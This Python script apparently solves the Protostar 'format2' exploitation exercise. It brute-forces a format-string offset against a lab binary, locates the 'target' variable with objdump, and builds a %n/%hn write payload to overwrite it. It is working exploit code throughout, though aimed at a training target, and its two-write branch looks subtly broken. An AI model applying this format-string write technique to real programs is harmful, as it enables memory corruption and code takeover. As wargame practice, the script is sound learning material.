#!/usr/bin/env python
#-*- coding: utf-8 -*-

import sys
import struct
import subprocess
import re


def find_var_addr(binary, var_name):
    addr = 0
    p1 = subprocess.Popen(["objdump", "-D", binary], stdout=subprocess.PIPE)
    p2 = subprocess.Popen(["grep", var_name], stdin=p1.stdout, stdout=subprocess.PIPE)
    p3 = subprocess.Popen(["awk", "{FS = \" \"; print $1}" ], stdin=p2.stdout, stdout=subprocess.PIPE)
    p1.stdout.close()
    p2.stdout.close()
    res = p3.communicate()[0]
    addr = int(res.strip(), base=16)
    return addr

def calc_payload(target_addr, offset, value): # magic formula
    hob, lob = divmod(value, 0x10000)
    print('value = {0}, hob = {1}, lob = {2}'.format(hex(value), hex(hob), hex(lob)))

    if hob <= 8 or lob <= 8:
        payload = struct.pack('<L', target_addr)
        payload += '%.' + str(value - 4) + 'd%' + str(offset) + '$n'
        return payload

    if hob < lob:
        tmp_addr = target_addr + 2
        tmp_hob = hob - 8
        tmp = lob - hob
        end = offset + 1
        payload = struct.pack('<L', tmp_addr)
        payload += struct.pack('<L', target_addr)
        payload += '%.'
        payload += struct.pack('<H', tmp_hob)
        payload += 'x%'
        payload += struct.pack('<L', offset)
        payload += '$hn%.'
        payload += struct.pack('<H', tmp)
        payload += 'x%'
        payload += struct.pack('<L', end)
    else:
        tmp_addr = target_addr + 2
        tmp_lob = lob - 8
        tmp = hob - lob
        end = offset + 1
        payload = struct.pack('<L', tmp_addr)
        payload += struct.pack('<L', target_addr)
        payload += '%.'
        payload += struct.pack('>H', tmp_lob)
        payload += 'x%'
        payload += struct.pack('<L', end)
        payload += '$hn%.'
        payload += struct.pack('>H', tmp)
        payload += 'x%'
        payload += struct.pack('<L', offset)
    return payload

found = False
for i in range(1, 800):
    payload = struct.pack('<L', 0x41414141)
    payload += '.%' + str(i) + '$x'
    p1 = subprocess.Popen(["echo", "-e", payload], stdout=subprocess.PIPE)
    p2 = subprocess.Popen(["/opt/protostar/bin/format2"], stdin=p1.stdout, stdout=subprocess.PIPE)
    p1.stdout.close()
    res = p2.communicate()[0]
    out_regex = re.compile('AAAA.41414141*')
    if out_regex.match(res):
        found = True
        break

if found:
    print('[+] Offset = {0}'.format(i))
    
    binary = '/opt/protostar/bin/format2'
    var_name = 'target'
    addr = find_var_addr(binary, var_name)
    
    payload = calc_payload(addr, i, 64)

    print(payload)
    p1 = subprocess.Popen(["echo", "-e", payload], stdout=subprocess.PIPE)
    p2 = subprocess.Popen([binary], stdin=p1.stdout, stdout=subprocess.PIPE)
    p1.stdout.close()
    res = p2.communicate()[0]
    print(res)
    '''
    process = subprocess.Popen(['/opt/protostar/bin/format2'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    process.stdin.write(payload)
    print process.stdout.read()
    '''
else:
    print('[-] Not found')
